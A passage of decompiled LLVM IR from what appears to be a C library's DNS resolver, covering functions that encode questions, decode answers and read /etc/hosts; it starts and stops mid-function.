  %v5_11d60 = zext i8 %v4_11d60 to i32
  %v2_11d64 = add i32 %tmp, 7
  %v3_11d64 = inttoptr i32 %v2_11d64 to i8*
  %v4_11d64 = load i8, i8* %v3_11d64, align 1
  %v5_11d64 = zext i8 %v4_11d64 to i32
  %v4_11d68 = mul nuw nsw i32 %v5_11d60, 256
  %v5_11d68 = or i32 %v5_11d64, %v4_11d68
  %v2_11d6c = add i32 %arg2, 36
  %v3_11d6c = inttoptr i32 %v2_11d6c to i32*
  store i32 %v5_11d68, i32* %v3_11d6c, align 4
  %v2_11d70 = add i32 %tmp, 8
  %v3_11d70 = inttoptr i32 %v2_11d70 to i8*
  %v4_11d70 = load i8, i8* %v3_11d70, align 1
  %v5_11d70 = zext i8 %v4_11d70 to i32
  %v2_11d74 = add i32 %tmp, 9
  %v3_11d74 = inttoptr i32 %v2_11d74 to i8*
  %v4_11d74 = load i8, i8* %v3_11d74, align 1
  %v5_11d74 = zext i8 %v4_11d74 to i32
  %v4_11d78 = mul nuw nsw i32 %v5_11d70, 256
  %v5_11d78 = or i32 %v5_11d74, %v4_11d78
  %v2_11d7c = add i32 %arg2, 40
  %v3_11d7c = inttoptr i32 %v2_11d7c to i32*
  store i32 %v5_11d78, i32* %v3_11d7c, align 4
  %v2_11d80 = add i32 %tmp, 11
  %v3_11d80 = inttoptr i32 %v2_11d80 to i8*
  %v4_11d80 = load i8, i8* %v3_11d80, align 1
  %v5_11d80 = zext i8 %v4_11d80 to i32
  %v2_11d84 = add i32 %tmp, 10
  %v3_11d84 = inttoptr i32 %v2_11d84 to i8*
  %v4_11d84 = load i8, i8* %v3_11d84, align 1
  %v5_11d84 = zext i8 %v4_11d84 to i32
  %v4_11d8c = mul nuw nsw i32 %v5_11d84, 256
  %v5_11d8c = or i32 %v4_11d8c, %v5_11d80
  %v2_11d90 = add i32 %arg2, 44
  %v3_11d90 = inttoptr i32 %v2_11d90 to i32*
  store i32 %v5_11d8c, i32* %v3_11d90, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 8, 9, 3, 5, 6, 7, 10, 1, 2, 11, 12, 13, 14, 15, 0, 4 }
  uselistorder i32 40, { 3, 4, 7, 6, 1, 5, 2, 0, 8, 9, 10, 11, 12 }
  uselistorder i32 28, { 9, 3, 4, 5, 10, 17, 26, 14, 16, 6, 15, 1, 18, 8, 2, 11, 12, 19, 20, 21, 22, 23, 24, 0, 25, 7, 13 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11d98 = load i32, i32* @r4, align 4
  store i32 %v3_11d98, i32* %stack_var_-16, align 4
  %v6_11d98 = load i32, i32* @r5, align 4
  %v9_11d98 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_11da0 = load i32, i32* %arg1, align 4
  store i32 %v2_11da0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_11dac = inttoptr i32 %v2_11da0 to i8*
  %v2_11dac = call i32 @__encode_dotted(i8* %v1_11dac)
  store i32 %v2_11dac, i32* %r0.global-to-local, align 4
  %v1_11db0 = icmp slt i32 %v2_11dac, 0
  br i1 %v1_11db0, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_11db8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_11db8, i32* @r4, align 4
  store i32 %v6_11d98, i32* @r5, align 4
  store i32 %v9_11d98, i32* @r6, align 4
  ret i32 %v2_11dac

bb6:                                              ; preds = %entry
  %v1_11db4 = load i32, i32* @r4, align 4
  %v2_11db4 = sub i32 %v1_11db4, %v2_11dac
  %v0_11dc0 = load i32, i32* @r6, align 4
  %v2_11dc0 = add i32 %v0_11dc0, %v2_11dac
  store i32 %v2_11dc0, i32* %r2.global-to-local, align 4
  %v7_11dc4 = icmp sgt i32 %v2_11db4, 3
  br i1 %v7_11dc4, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_11dc8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_11dc8, i32* @r4, align 4
  store i32 %v6_11d98, i32* @r5, align 4
  store i32 %v9_11d98, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_11dcc = load i32, i32* @r5, align 4
  %v1_11dcc = add i32 %v0_11dcc, 5
  %v2_11dcc = inttoptr i32 %v1_11dcc to i8*
  %v3_11dcc = load i8, i8* %v2_11dcc, align 1
  %v5_11dd0 = inttoptr i32 %v2_11dc0 to i8*
  store i8 %v3_11dcc, i8* %v5_11dd0, align 1
  %v0_11dd4 = load i32, i32* @r5, align 4
  %v1_11dd4 = add i32 %v0_11dd4, 4
  %v2_11dd4 = inttoptr i32 %v1_11dd4 to i32*
  %v3_11dd4 = load i32, i32* %v2_11dd4, align 4
  %v1_11dd8 = trunc i32 %v3_11dd4 to i8
  %v2_11dd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_11dd8 = add i32 %v2_11dd8, 1
  %v4_11dd8 = inttoptr i32 %v3_11dd8 to i8*
  store i8 %v1_11dd8, i8* %v4_11dd8, align 1
  %v0_11ddc = load i32, i32* @r5, align 4
  %v1_11ddc = add i32 %v0_11ddc, 9
  %v2_11ddc = inttoptr i32 %v1_11ddc to i8*
  %v3_11ddc = load i8, i8* %v2_11ddc, align 1
  %v2_11de0 = load i32, i32* %r2.global-to-local, align 4
  %v3_11de0 = add i32 %v2_11de0, 2
  %v4_11de0 = inttoptr i32 %v3_11de0 to i8*
  store i8 %v3_11ddc, i8* %v4_11de0, align 1
  %v0_11de4 = load i32, i32* @r5, align 4
  %v1_11de4 = add i32 %v0_11de4, 8
  %v2_11de4 = inttoptr i32 %v1_11de4 to i32*
  %v3_11de4 = load i32, i32* %v2_11de4, align 4
  %v0_11de8 = load i32, i32* %r0.global-to-local, align 4
  %v1_11de8 = add i32 %v0_11de8, 4
  store i32 %v1_11de8, i32* %r0.global-to-local, align 4
  %v1_11dec = trunc i32 %v3_11de4 to i8
  %v2_11dec = load i32, i32* %r2.global-to-local, align 4
  %v3_11dec = add i32 %v2_11dec, 3
  %v4_11dec = inttoptr i32 %v3_11dec to i8*
  store i8 %v1_11dec, i8* %v4_11dec, align 1
  %v2_11df0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11df0, i32* @r4, align 4
  store i32 %v6_11d98, i32* @r5, align 4
  store i32 %v9_11d98, i32* @r6, align 4
  ret i32 %v1_11de8

; uselistorder directives
  uselistorder i32 %v2_11dac, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_11d98, { 1, 0, 2 }
  uselistorder i32 %v6_11d98, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_11df8 = call i32 @__length_dotted()
  %v1_11dfc = icmp slt i32 %v0_11df8, 0
  br i1 %v1_11dfc, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_11e00 = add i32 %v0_11df8, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_11e04 = phi i32 [ %v0_11df8, %entry ], [ %v4_11e00, %bb ]
  ret i32 %v5_11e04

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_11e08 = load i32, i32* @r4, align 4
  %v6_11e08 = load i32, i32* @r5, align 4
  %v9_11e08 = load i32, i32* @r6, align 4
  %v12_11e08 = load i32, i32* @r7, align 4
  %v21_11e08 = load i32, i32* @sl, align 4
  %v2_11e0c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_11e0c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_11e28 = call i32 @__decode_dotted()
  store i32 %v0_11e28, i32* %r0.global-to-local, align 4
  store i32 %v0_11e28, i32* @r7, align 4
  %v1_11e2c = icmp slt i32 %v0_11e28, 0
  %v0_11e30 = load i32, i32* @r4, align 4
  %v2_11e30 = add i32 %v0_11e30, %v0_11e28
  store i32 %v2_11e30, i32* %r8.global-to-local, align 4
  br i1 %v1_11e2c, label %bb14, label %dec_label_pc_11e40

dec_label_pc_11e40:                               ; preds = %entry
  %v1_11e38 = load i32, i32* @r5, align 4
  %v2_11e38 = sub i32 %v1_11e38, %v2_11e30
  %v1_11e40 = add i32 %v2_11e38, -10
  store i32 %v1_11e40, i32* @r5, align 4
  %v6_11e40 = icmp slt i32 %v1_11e40, 0
  store i32 %v2_11e0c, i32* %r0.global-to-local, align 4
  %v0_11e48 = load i32, i32* @sl, align 4
  %v2_11e48 = add i32 %v0_11e48, %v2_11e30
  store i32 %v2_11e48, i32* @r4, align 4
  br i1 %v6_11e40, label %bb, label %dec_label_pc_11e54

bb:                                               ; preds = %dec_label_pc_11e40
  br label %bb14

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e40
  %v1_11e54 = bitcast i32* %stack_var_-288 to i8*
  %v2_11e54 = call i32 @__GI_strdup(i8* %v1_11e54)
  store i32 %v2_11e54, i32* %r0.global-to-local, align 4
  %v1_11e58 = load i32, i32* @r6, align 4
  %v2_11e58 = inttoptr i32 %v1_11e58 to i32*
  store i32 %v2_11e54, i32* %v2_11e58, align 4
  %v0_11e5c = load i32, i32* @sl, align 4
  %v1_11e5c = load i32, i32* %r8.global-to-local, align 4
  %v2_11e5c = add i32 %v1_11e5c, %v0_11e5c
  %v3_11e5c = inttoptr i32 %v2_11e5c to i8*
  %v4_11e5c = load i8, i8* %v3_11e5c, align 1
  %v6_11e5c = zext i8 %v4_11e5c to i32
  %v0_11e60 = load i32, i32* @r4, align 4
  %v1_11e60 = add i32 %v0_11e60, 1
  %v2_11e60 = inttoptr i32 %v1_11e60 to i8*
  %v3_11e60 = load i8, i8* %v2_11e60, align 1
  %v4_11e60 = zext i8 %v3_11e60 to i32
  %v4_11e64 = mul nuw nsw i32 %v6_11e5c, 256
  %v5_11e64 = or i32 %v4_11e60, %v4_11e64
  store i32 %v5_11e64, i32* %r3.global-to-local, align 4
  %v1_11e68 = load i32, i32* @r6, align 4
  %v2_11e68 = add i32 %v1_11e68, 4
  %v3_11e68 = inttoptr i32 %v2_11e68 to i32*
  store i32 %v5_11e64, i32* %v3_11e68, align 4
  %v0_11e6c = load i32, i32* @r4, align 4
  %v1_11e6c = add i32 %v0_11e6c, 2
  store i32 %v1_11e6c, i32* %r1.global-to-local, align 4
  %v2_11e70 = inttoptr i32 %v1_11e6c to i8*
  %v3_11e70 = load i8, i8* %v2_11e70, align 1
  %v4_11e70 = zext i8 %v3_11e70 to i32
  %v1_11e74 = add i32 %v0_11e6c, 3
  %v2_11e74 = inttoptr i32 %v1_11e74 to i8*
  %v3_11e74 = load i8, i8* %v2_11e74, align 1
  %v4_11e74 = zext i8 %v3_11e74 to i32
  %v4_11e78 = mul nuw nsw i32 %v4_11e70, 256
  %v5_11e78 = or i32 %v4_11e74, %v4_11e78
  store i32 %v5_11e78, i32* %r3.global-to-local, align 4
  %v1_11e7c = load i32, i32* @r6, align 4
  %v2_11e7c = add i32 %v1_11e7c, 8
  %v3_11e7c = inttoptr i32 %v2_11e7c to i32*
  store i32 %v5_11e78, i32* %v3_11e7c, align 4
  %v0_11e80 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e80 = add i32 %v0_11e80, 2
  %v1_11e84 = add i32 %v0_11e80, 3
  %v2_11e84 = inttoptr i32 %v1_11e84 to i8*
  %v3_11e84 = load i8, i8* %v2_11e84, align 1
  %v4_11e84 = zext i8 %v3_11e84 to i32
  store i32 %v4_11e84, i32* %r3.global-to-local, align 4
  %v2_11e88 = inttoptr i32 %v1_11e80 to i8*
  %v3_11e88 = load i8, i8* %v2_11e88, align 1
  %v4_11e88 = zext i8 %v3_11e88 to i32
  store i32 %v4_11e88, i32* %r0.global-to-local, align 4
  %v1_11e8c = add i32 %v0_11e80, 5
  %v2_11e8c = inttoptr i32 %v1_11e8c to i8*
  %v3_11e8c = load i8, i8* %v2_11e8c, align 1
  %v4_11e8c = zext i8 %v3_11e8c to i32
  store i32 %v4_11e8c, i32* @ip, align 4
  %v3_11e90 = mul nuw nsw i32 %v4_11e84, 65536
  store i32 %v3_11e90, i32* %r3.global-to-local, align 4
  %v1_11e94 = add i32 %v0_11e80, 4
  %v2_11e94 = inttoptr i32 %v1_11e94 to i8*
  %v3_11e94 = load i8, i8* %v2_11e94, align 1
  %v4_11e94 = zext i8 %v3_11e94 to i32
  %v4_11e98 = mul nuw i32 %v4_11e88, 16777216
  %v5_11e98 = or i32 %v4_11e98, %v3_11e90
  %v2_11e9c = or i32 %v5_11e98, %v4_11e8c
  %v4_11ea0 = mul nuw nsw i32 %v4_11e94, 256
  %v5_11ea0 = or i32 %v2_11e9c, %v4_11ea0
  store i32 %v5_11ea0, i32* %r3.global-to-local, align 4
  %v1_11ea4 = load i32, i32* @r6, align 4
  %v2_11ea4 = add i32 %v1_11ea4, 12
  %v3_11ea4 = inttoptr i32 %v2_11ea4 to i32*
  store i32 %v5_11ea0, i32* %v3_11ea4, align 4
  %v0_11ea8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ea8 = add i32 %v0_11ea8, 6
  %v2_11ea8 = inttoptr i32 %v1_11ea8 to i8*
  %v3_11ea8 = load i8, i8* %v2_11ea8, align 1
  %v4_11ea8 = zext i8 %v3_11ea8 to i32
  %v0_11eac = load i32, i32* @r4, align 4
  %v1_11eac = add i32 %v0_11eac, 9
  %v2_11eac = inttoptr i32 %v1_11eac to i8*
  %v3_11eac = load i8, i8* %v2_11eac, align 1
  %v4_11eac = zext i8 %v3_11eac to i32
  %v1_11eb0 = add i32 %v0_11eac, 10
  store i32 %v1_11eb0, i32* %r0.global-to-local, align 4
  %v4_11eb4 = mul nuw nsw i32 %v4_11ea8, 256
  %v5_11eb4 = or i32 %v4_11eac, %v4_11eb4
  store i32 %v5_11eb4, i32* %r3.global-to-local, align 4
  %v0_11eb8 = load i32, i32* %r8.global-to-local, align 4
  %v1_11eb8 = add i32 %v0_11eb8, 10
  %v0_11ebc = load i32, i32* @r5, align 4
  %v1_11ec0 = add nuw nsw i32 %v5_11eb4, 10
  store i32 %v1_11ec0, i32* %r1.global-to-local, align 4
  %v1_11ec4 = load i32, i32* @r6, align 4
  %v2_11ec4 = add i32 %v1_11ec4, 24
  %v3_11ec4 = inttoptr i32 %v2_11ec4 to i32*
  store i32 %v1_11eb8, i32* %v3_11ec4, align 4
  %v0_11ec8 = load i32, i32* %r0.global-to-local, align 4
  %v1_11ec8 = load i32, i32* @r6, align 4
  %v2_11ec8 = add i32 %v1_11ec8, 20
  %v3_11ec8 = inttoptr i32 %v2_11ec8 to i32*
  store i32 %v0_11ec8, i32* %v3_11ec8, align 4
  %v0_11ecc = load i32, i32* %r3.global-to-local, align 4
  %v1_11ecc = load i32, i32* @r6, align 4
  %v2_11ecc = add i32 %v1_11ecc, 16
  %v3_11ecc = inttoptr i32 %v2_11ecc to i32*
  store i32 %v0_11ecc, i32* %v3_11ecc, align 4
  %v0_11ed0 = load i32, i32* @r7, align 4
  %v1_11ed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ed0 = add i32 %v1_11ed0, %v0_11ed0
  %v5_11ed4 = icmp slt i32 %v0_11ebc, %v5_11eb4
  %.v2_11ed0 = select i1 %v5_11ed4, i32 -1, i32 %v2_11ed0
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_11e54, %entry
  %v0_11ed8 = phi i32 [ %.v2_11ed0, %dec_label_pc_11e54 ], [ %v1_11e40, %bb ], [ %v0_11e28, %entry ]
  store i32 %v0_11ed8, i32* %r0.global-to-local, align 4
  store i32 %v3_11e08, i32* @r4, align 4
  store i32 %v6_11e08, i32* @r5, align 4
  store i32 %v9_11e08, i32* @r6, align 4
  store i32 %v12_11e08, i32* @r7, align 4
  store i32 %v21_11e08, i32* @sl, align 4
  ret i32 %v0_11ed8

; uselistorder directives
  uselistorder i32 %v0_11ed8, { 1, 0 }
  uselistorder i32 %v5_11eb4, { 1, 0, 2 }
  uselistorder i32 %v3_11e90, { 1, 0 }
  uselistorder i32 %v1_11e40, { 0, 2, 1 }
  uselistorder i32 %v0_11e28, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 20, { 13, 14, 15, 16, 0, 19, 26, 3, 27, 1, 4, 17, 5, 20, 21, 9, 12, 10, 6, 2, 7, 22, 23, 24, 25, 11, 18, 8 }
  uselistorder i32 24, { 6, 7, 8, 15, 14, 0, 9, 10, 11, 16, 2, 5, 3, 1, 12, 17, 18, 19, 20, 21, 22, 4, 23, 13 }
  uselistorder i32 9, { 5, 6, 7, 8, 9, 0, 10, 1, 11, 12, 2, 13, 14, 15, 16, 17, 3, 4 }
  uselistorder i32 6, { 8, 9, 10, 6, 7, 11, 12, 1, 2, 3, 14, 4, 5, 13, 0 }
  uselistorder i32 5, { 1, 15, 16, 17, 11, 5, 2, 12, 13, 6, 14, 3, 4, 0, 18, 19, 7, 8, 9, 10 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_149e0.708 to i32), i32* @r1, align 4
  %v0_11ee8 = load i32, i32* @lr, align 4
  store i32 %v0_11ee8, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_14a44.744 to i32), i32* @r0, align 4
  %v3_11ef0 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_14a44.744 to i32), i32 ptrtoint (i32* @global_var_149e0.708 to i32))
  %v2_11ef4 = icmp eq i32 %v3_11ef0, 0
  store i32 ptrtoint (i32* @global_var_149e0.708 to i32), i32* @r1, align 4
  br i1 %v2_11ef4, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_11ef0

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_14a50.746 to i32), i32* @r0, align 4
  %v2_11f04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_11f04, i32* @lr, align 4
  %v3_11f08 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_14a50.746 to i32), i32 ptrtoint (i32* @global_var_149e0.708 to i32))
  ret i32 %v3_11f08

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 7, 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_149e0.708 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_11f18 = load i32, i32* @r4, align 4
  %v6_11f18 = load i32, i32* @r5, align 4
  %v12_11f18 = load i32, i32* @r7, align 4
  %v15_11f18 = load i32, i32* @r8, align 4
  %v21_11f18 = load i32, i32* @sl, align 4
  %v24_11f18 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_11f24 = sub i32 0, %tmp61
  %v1_11f28 = urem i32 %v1_11f24, 4
  store i32 %v1_11f28, i32* @ip, align 4
  %v2_11f28 = icmp eq i32 %v1_11f28, 0
  %v0_11f2c = load i32, i32* @r2, align 4
  %v0_11f30 = load i32, i32* @r0, align 4
  %v0_11f34 = load i32, i32* @r1, align 4
  %v0_11f38 = load i32, i32* @r3, align 4
  store i32 %v0_11f38, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_11f28, label %dec_label_pc_11f58, label %dec_label_pc_11f48

dec_label_pc_11f48:                               ; preds = %entry
  %v2_11f48 = sub i32 %tmp57, %v1_11f28
  %v3_11f48 = icmp ult i32 %tmp57, %v1_11f28
  br i1 %v3_11f48, label %dec_label_pc_1222c, label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f48
  store i32 %v2_11f48, i32* %r2.global-to-local, align 4
  %v2_11f54 = add i32 %v1_11f28, %tmp61
  store i32 %v2_11f54, i32* @r4, align 4
  br label %dec_label_pc_11f58

dec_label_pc_11f58:                               ; preds = %entry, %dec_label_pc_11f50
  %v0_11f68 = phi i32 [ %tmp61, %entry ], [ %v2_11f54, %dec_label_pc_11f50 ]
  %v0_11f6c = phi i32 [ %tmp57, %entry ], [ %v2_11f48, %dec_label_pc_11f50 ]
  %tmp = icmp ult i32 %v0_11f6c, 32
  br i1 %tmp, label %dec_label_pc_1222c, label %dec_label_pc_11f60

dec_label_pc_11f60:                               ; preds = %dec_label_pc_11f58
  store i32 %v0_11f38, i32* %r0.global-to-local, align 4
  %v7_11f64 = icmp eq i32 %v0_11f38, 1
  %v1_11f68 = add i32 %v0_11f68, 32
  store i32 %v1_11f68, i32* @fp, align 4
  %v1_11f6c = add i32 %v0_11f6c, -32
  store i32 %v1_11f6c, i32* @r8, align 4
  br i1 %v7_11f64, label %dec_label_pc_12098, label %dec_label_pc_11f74

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11f60
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_11f80 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_11f80, align 4
  %tmp80 = icmp ult i32 %v1_11f6c, 4
  br i1 %tmp80, label %dec_label_pc_1222c, label %dec_label_pc_11f88

dec_label_pc_11f88:                               ; preds = %dec_label_pc_11f74
  %v0_11f88 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f88 = add i32 %v0_11f88, -36
  store i32 %v1_11f88, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_11f88, 8
  br i1 %tmp81, label %dec_label_pc_1222c, label %dec_label_pc_11f94

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11f88
  %v0_11f94 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_11f94, 16
  br i1 %tmp82, label %dec_label_pc_1222c, label %dec_label_pc_11f9c

dec_label_pc_11f9c:                               ; preds = %dec_label_pc_11f94
  %v1_11f9c = add i32 %v0_11f88, -48
  store i32 %v1_11f9c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_11f9c, 8
  br i1 %tmp83, label %dec_label_pc_1222c, label %dec_label_pc_11fa8

dec_label_pc_11fa8:                               ; preds = %dec_label_pc_11f9c
  %v1_11fa8 = add i32 %v0_11f88, -44
  store i32 %v1_11fa8, i32* @r8, align 4
  %v1_11fac = add i32 %v0_11f88, -56
  store i32 %v1_11fac, i32* %r3.global-to-local, align 4
  %v3_11fb0 = icmp ult i32 %v1_11fac, %v1_11fa8
  br i1 %v3_11fb0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_11fa8
  %v1_11fb8 = load i32, i32* @r4, align 4
  %v2_11fb8 = add i32 %v1_11fb8, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_11fa8
  store i32 %v1_11fac, i32* @r8, align 4
  %v1_11fbc.pre = load i32, i32* @r4, align 4
  %v2_11fbc = add i32 %v1_11fbc.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_11fbc, %.thread1 ], [ %v2_11fb8, %bb ]
  %v0_11fc4 = phi i32 [ %v1_11fbc.pre, %.thread1 ], [ %v1_11fb8, %bb ]
  %v0_11fc0 = phi i32 [ %v1_11fac, %.thread1 ], [ %v1_11fa8, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_11fc4 = add i32 %v0_11fc4, 36
  store i32 %v1_11fc4, i32* @r6, align 4
  %v1_11fc8 = add i32 %v0_11fc4, 48
  store i32 %v1_11fc8, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_11fc0, 80
  br i1 %tmp84, label %dec_label_pc_1222c, label %dec_label_pc_11fd0

dec_label_pc_11fd0:                               ; preds = %bb74
  %v0_11fd0 = call i32 @__open_etc_hosts()
  store i32 %v0_11fd0, i32* %r0.global-to-local, align 4
  %v2_11fd4 = icmp eq i32 %v0_11fd0, 0
  br i1 %v2_11fd4, label %dec_label_pc_11ff0, label %.thread

.thread:                                          ; preds = %dec_label_pc_11fd0
  %v1_11fdc = load i32, i32* @fp, align 4
  store i32 %v1_11fdc, i32* @r7, align 4
  %v1_11fe0 = load i32, i32* @r5, align 4
  store i32 %v1_11fe0, i32* @fp, align 4
  %v1_11fe4 = load i32, i32* @r6, align 4
  %v1_11fe8 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_120a4

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_11fd0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_11ff8 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_11ff8, align 4
  %v0_11ffc = call i32 @__errno_location()
  store i32 %v0_11ffc, i32* %r0.global-to-local, align 4
  %v1_12000 = inttoptr i32 %v0_11ffc to i32*
  %v2_12000 = load i32, i32* %v1_12000, align 4
  store i32 %v2_12000, i32* @sl, align 4
  br label %dec_label_pc_12230

dec_label_pc_12008:                               ; preds = %dec_label_pc_121b8
  %v0_12008 = load i32, i32* @r4, align 4
  %v1_12008 = add i32 %v0_12008, 4
  %v2_12008 = inttoptr i32 %v1_12008 to i32*
  %v3_12008 = load i32, i32* %v2_12008, align 4
  %v1_1200c = load i32, i32* @sb, align 4
  %v2_1200c = inttoptr i32 %v1_1200c to i32*
  store i32 %v3_12008, i32* %v2_1200c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* @ip, align 4
  %v0_12020 = load i32, i32* @r4, align 4
  %v1_12020 = add i32 %v0_12020, 8
  store i32 %v1_12020, i32* %r1.global-to-local, align 4
  %v1_12024 = load i32, i32* @sb, align 4
  %v2_12024 = add i32 %v1_12024, 8
  %v3_12024 = inttoptr i32 %v2_12024 to i32*
  store i32 2, i32* %v3_12024, align 4
  %v0_12028 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12028, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_12030 = load i32, i32* @sb, align 4
  %v1_12030 = load i32, i32* @ip, align 4
  %v2_12030 = inttoptr i32 %v1_12030 to i32*
  store i32 %v0_12030, i32* %v2_12030, align 4
  %v0_12034 = load i32, i32* @r7, align 4
  %v1_12034 = load i32, i32* %r0.global-to-local, align 4
  %v2_12034 = inttoptr i32 %v1_12034 to i32*
  store i32 %v0_12034, i32* %v2_12034, align 4
  %v0_12038 = load i32, i32* %r3.global-to-local, align 4
  %v1_12038 = load i32, i32* @sb, align 4
  %v2_12038 = add i32 %v1_12038, 12
  %v3_12038 = inttoptr i32 %v2_12038 to i32*
  store i32 %v0_12038, i32* %v3_12038, align 4
  %v0_1203c = load i32, i32* %r0.global-to-local, align 4
  %v1_1203c = load i32, i32* @sb, align 4
  %v2_1203c = add i32 %v1_1203c, 16
  %v3_1203c = inttoptr i32 %v2_1203c to i32*
  store i32 %v0_1203c, i32* %v3_1203c, align 4
  %v0_12040 = load i32, i32* %r1.global-to-local, align 4
  %v1_12040 = load i32, i32* @sb, align 4
  %v2_12040 = add i32 %v1_12040, 4
  %v3_12040 = inttoptr i32 %v2_12040 to i32*
  store i32 %v0_12040, i32* %v3_12040, align 4
  %v0_12044 = load i32, i32* %r2.global-to-local, align 4
  %v1_12044 = load i32, i32* %r0.global-to-local, align 4
  %v2_12044 = add i32 %v1_12044, 4
  %v3_12044 = inttoptr i32 %v2_12044 to i32*
  store i32 %v0_12044, i32* %v3_12044, align 4
  br label %dec_label_pc_12214

